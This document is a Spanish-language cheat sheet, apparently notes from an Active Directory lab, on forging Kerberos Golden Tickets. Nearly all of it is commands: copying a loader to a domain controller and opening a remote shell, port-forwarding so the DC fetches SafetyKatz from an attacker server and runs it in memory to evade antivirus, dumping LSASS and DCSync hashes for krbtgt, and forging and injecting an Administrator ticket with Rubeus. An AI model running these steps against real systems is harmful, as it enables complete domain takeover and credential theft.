# Golden Ticket  

Tags: #AD #Windows #Rubeus #Powershell #SafetyKatz 

```bash 
- Un golden ticket está firmado y cifrado utilizando el hash de la cuenta 'krbtgt', lo que lo convierte en un ticket TGT válido.
- El hash del usuario 'krbtgt' puede usarse para suplantar a cualquier usuario con cualquier nivel de privilegios, incluso desde una máquina que no pertenece al dominio.
- Como buena práctica, se recomienda cambiar la contraseña de la cuenta 'krbtgt' dos veces, ya que el historial de contraseñas se mantiene para esa cuenta.
```

```powershell 
# Compartir el Loader en la sesión (cmd) con OPTH que tiene el ticket inyectado
❯ echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y    # Copiar Loader al DC desde la PC atacante
❯ winrs -r:dcorp-dc cmd     # Ingresar al server DC

# Ejecutar desde dentro del DC
❯ netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.x
# Funciona para ejecutar directamente 'SafetyKatz' directamente en el DC sin descargarlo 
```

## SafetyKatz

```powershell 
! Usuario: Domain Admin o cuenta con privilegio SeDebugPrivilege / acceso a LSASS

❯ .\SafetyKatz.exe "lsadump::lsa /patch"
# Ejecuta SafetyKatz (versión ofuscada de mimikatz) para volcar los hashes NTLM de todas las cuentas del dominio desde LSASS vía el módulo LSA — equivalente a sekurlsa::logonpasswords pero apuntando directo al proceso LSA con patch en memoria.

❯ .\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-lsa /patch" "exit"
# Carga SafetyKatz en memoria desde un servidor HTTP local vía Loader.exe (evasión de disco) y ejecuta lsadump::evasive-lsa /patch para volcar hashes NTLM — variante evasiva que evita tocar disco y reduce detección por AV/EDR

❯ .\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
# Ejecuta un ataque DCSync para obtener el hash NTLM de la cuenta krbtgt — simula el comportamiento de un DC para replicar credenciales sin necesidad de ejecutar código en el DC. Base para crear Golden Tickets.
```

## Rubeus 


```powershell 
❯ echo F | xcopy C:\AD\Loader.exe \\dcorp-dc\C$\User\Public\Loader.exe /Y
# Copia Loader.exe al DC vía SMB (admin share) sobreescribiendo si existe, requiere acceso de administrador al DC.

❯ winrs -r:dcorp-dc cmd
# Abre una shell remota en el DC vía WinRM usando las credenciales actuales, alternativa ligera a PSRemoting.

❯ netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=IP_WStudent
# Crea un port forwarding en el DC: redirige tráfico del puerto 8080 local hacia el puerto 80 del atacante, permite que el DC alcance el servidor HTTP donde está SafetyKatz.

❯ .\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-lsa /patch" "exit"
# Desde el DC, carga SafetyKatz en memoria vía el portforwarding y vuelca los hashes NTLM de todas las cuentas incluyendo krbtgt, evasión completa sin tocar disco.
```

```powershell
! Usuario: Domain Admin (requiere hash AES256 de krbtgt y SID del dominio)

❯ .\Rubeus.exe asktgt /user:svcadmin /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
# Solicita un TGT para svcadmin usando su clave AES256 (más sigiloso que RC4/NTLM), crea un proceso cmd.exe en modo sacrificio (/createnetonly) para inyectar el ticket sin contaminar la sesión actual, y lo muestra — enfoque OPSEC-friendly para movimiento lateral.

❯ .\Loader.exe -path C:\AD\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
# Carga SafetyKatz vía Loader.exe (evasión de disco) y ejecuta DCSync en su variante evasiva para obtener el hash NTLM/AES de krbtgt, combina evasión de AV/EDR con replicación de credenciales sin ejecutar código en el DC.
```

```powershell 
# Comandos fuera del DC 
Paso 1: Construir el Golden Ticket (Preparar información y generar plantilla.)

❯ .\Loader.exe -path C:\AD\Rubeus.exe -args evasive-golden /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /printcmd
# Cargar Rubeus en memoria vía Loader.exe para evadir AV/EDR — preferible en entornos con detección activa.
# Forjar un Golden Ticket usando la clave AES256 de krbtgt y el SID del dominio. /ldap consulta automáticamente al DC para obtener grupos, flags y netbios. /printcmd imprime el comando completo de forja para reutilizarlo de forma más OPSEC-friendly sin hacer queries LDAP. Obtener una autenticación como el usuario Administrador 
	# aes256 = aes de la cuenta KRBTGT 
	# sid = sid de la cuenta KRBTGT

❯ .\Rubeus.exe golden /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /printcmd


Notes:
	1. Above command generates the ticket forging command. Note that 3 LDAP queries are sent to the DC to retrieve the values:
		1. To retrieve flags for user specified in /user.
		2. To retrieve /groups, /pgid, /minpassage and /maxpassage
		3. To retrieve /netbios of the current domain
	2. If you have already enumerated the above values, manually specify as many you can in the forging command (a bit more opsec friendly).
```

```powershell 
Paso 2: Forjar + Inyectar el ticket en memoria

❯ .\Rubeus.exe golden /aes256:154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848 /user:Administrator /id:500 /pgid:513 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /pwdlastset:"11/11/2022 6:33:55 AM" /minpassage:1 /logoncount:2453 /netbios:dcorp /groups:544,512,520,513 /dc:DCORP-DC.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD
# Forja e inyecta un Golden Ticket con atributos realistas del usuario Administrator — usando los valores obtenidos con /printcmd para no hacer queries LDAP adicionales (más OPSEC). Sin /ptt solo forja el ticket.

❯ .\Loader.exe -path C:\AD\Rubeus.exe -args evasive-golden /aes256:154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848 /user:Administrator /id:500 /pgid:513 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /pwdlastset:"11/11/2022 6:33:55 AM" /minpassage:1 /logoncount:2453 /netbios:dcorp /groups:544,512,520,513 /dc:DCORP-DC.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt
# Igual pero cargando Rubeus en memoria vía Loader.exe e inyectando el ticket con /ptt — versión evasiva para entornos con AV/EDR activo.
	# uac = Atributos del usuario 


Paso 3:

❯ winrs -r:dcorp-dc cmd
# Abre shell remota en el DC usando el Golden Ticket inyectado en la sesión actual.

	❯ set username
	# Verifica que el contexto de la shell remota corresponde a Administrator.
	❯ set computername
	# Verifica que la máquina remota es efectivamente el DC (dcorp-dc).
```
![Golden-Ticket-Rubeus.png | 900](https://i.postimg.cc/TwC7VQBy/Golden-Ticket-Rubeus.png)](https://postimg.cc/WFqwjmNj)
[![Golden-Ticket-Rubeus2.png | 900 ](https://i.postimg.cc/0jjtcDqV/Golden-Ticket-Rubeus2.png)](https://postimg.cc/p5NYd9rj)
![Golden-Ticket.png](https://i.postimg.cc/6pM86Jv4/Golden-Ticket.png)](https://postimg.cc/5XF4prpf)